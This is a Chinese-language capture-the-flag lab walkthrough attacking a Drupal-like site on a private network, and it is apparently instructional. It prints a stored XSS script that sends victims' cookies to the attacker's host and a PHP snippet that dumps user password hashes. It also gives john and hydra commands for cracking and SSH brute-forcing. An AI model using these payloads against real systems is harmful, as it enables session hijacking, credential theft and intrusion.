
# 环境
攻击机IP：192.168.1.37<br />目标机IP：192.168.1.3


# 实战

## 端口扫描
```
nmap -sV -p- 192.168.1.3
```
![image.png](./assets/1657691178383-dd0242b4-3509-43d4-89c6-d3e223de37c4.png)

访问80端口HTTP服务
![image.png](./assets/1657691197709-5c0aa557-956f-422c-bb9b-74093913e27e.png)

查看网页源码<br />找到了一个flag没有其他的什么信息
![image.png](./assets/1657691210558-6dd9ec3f-d679-424f-a4e6-fb5d7b2d10c8.png)


## 目录扫描
使用dirb扫描
```
dirb http://192.168.1.3
```

扫描出来的有用文件有
```
+ http://192.168.1.3/phpinfo.php (CODE:200|SIZE:47653)
+ http://192.168.1.3/robots.txt (CODE:200|SIZE:1629)
```

访问`http://192.168.1.3/phpinfo.php`得到一个flag
![image.png](./assets/1657691225659-db7916e7-12ba-45b3-ad20-84ffcfc8fd22.png)

访问`http://192.168.1.3/robots.txt`得到一个flag
![image.png](./assets/1657691232820-25648485-230d-428a-be5b-9315db545d19.png)


## 漏洞发现
注册一个账号
![image.png](./assets/1657691241362-3a93a0ae-b011-4c12-bf91-34a7320a4692.png)

注册账号后登录，在首页的文章下面可以进行评论，尝试是否存在XSS漏洞
![image.png](./assets/1657691248370-cc2ffb80-7666-4197-bdfe-75b968a42934.png)

成功弹窗
![image.png](./assets/1657691255933-32c0005b-7320-43f7-a8e3-cda625050783.png)


## 漏洞利用
存在XSS漏洞，我们可以利用该XSS漏洞来获取其他用户的session_id，然后利用得到的session_id登录他人的账户以获得更高的用户权限

在网页中我们可以看到有两个高管
![image.png](./assets/1657691265531-78047bfc-6032-452a-aabc-2ec5633bde1c.png)

在他们的帖子下面进行留言
```
<script>
var request=new XMLHttpRequest();
var redirect_url="http://192.168.1.37:8080/"+document.cookie;
request.open("GET",redirect_url);
request.send();
</script>
```
![image.png](./assets/1657691274503-82ab7238-02e3-4923-b6c5-6f69a87ca1d1.png)

在攻击机上开启web服务
```
python -m SimpleHTTPServer 8080
```
![image.png](./assets/1657691284076-9fa54763-1129-4ac2-9308-30bbd975973b.png)

给史蒂夫发送邮件引导他查看文章
![image.png](./assets/1657691291590-b03084be-da4f-49cd-ad49-bef3096d6e79.png)

回到攻击机可以看到成功得到session_id
```
SESScc9d4028d80b7d9c2242cf5fc8cb25f2=mkoi1627khd9cjdh5m0e002jh3;%20has_js=1
```
![image.png](./assets/1657691301920-b1b483d1-86c6-4ca3-a2fb-00b7c95939b2.png)

访问网站首页并使用burpsuite抓包将cookie更改为我们抓取到的cookie
![image.png](./assets/1657691317179-432814f8-87ac-4f66-99c6-aa9460f08141.png)

成功以steve的身份登录
![image.png](./assets/1657691324359-4a5d8a4b-ba20-4d39-a99b-c16e48e70eb0.png)

左上角选择再添加文章，这里也需要抓包替换cookie不然的话我们后面的身份还是自己
![image.png](./assets/1657691332992-ad3ad389-ddc5-4268-a0b3-f9053f2e41e1.png)

![image.png](./assets/1657691339564-947b6716-df08-426c-944c-2fd36f08cf28.png)

在 input format 中选择 PHP code，并添加如下代码
```
<?php
$result = db_query('select name,pass from users');
while($record = db_fetch_object($result))
{
print $record->name . ":" . $record->pass . "<br/>";
}
?>
```
![image.png](./assets/1657691348389-9937565f-e8b3-4602-8869-2d6a181948b7.png)

提交时同样需要替换cookie，提交后成功得到账户和密码的哈希值
![image.png](./assets/1657691357011-46377832-5612-4b54-9e3b-d4f1113bbb2f.png)

使用john爆破密码
```
john -w=/usr/share/wordlists/rockyou.txt -form=raw-md5 password.txt
```
![image.png](./assets/1657691365845-6add6a08-9d7f-48e5-8763-a9bf4f28c061.png)

获取用户名，每一个用户在 user 目录下对应一个 ID
![image.png](./assets/1657691372933-cc66e160-2ab4-4532-b093-8d3a4d3e5752.png)

将得到的用户名和密码分别保存使用hydra进行爆破
```
hydra -L user.txt -P password.txt -t 4 ssh://192.168.1.3
```
![image.png](./assets/1657691381148-1e0a0edc-457f-4545-8a47-5e1e6809cf14.png)


## 提权
使用ssh登录jharraway用户，得到一个flag，无法提权到root用户
![image.png](./assets/1657691388219-2425fc52-aa4c-492e-a4fb-baafef56575a.png)

查看passwd文件得到另一个flag
![image.png](./assets/1657691395638-6ebfa36e-f0f3-48b6-96e7-1e2af0e877c9.png)

登录spinkton用户，ssh链接得到一个flag
![image.png](./assets/1657691402087-7929646d-bdef-4ab1-ad46-3aa2817d419e.png)

查看权限发现我们拥有所有的root权限，提权成功得到root权限
![image.png](./assets/1657691409285-3f4e925f-0d6d-4b27-9227-1bfb412b1815.png)
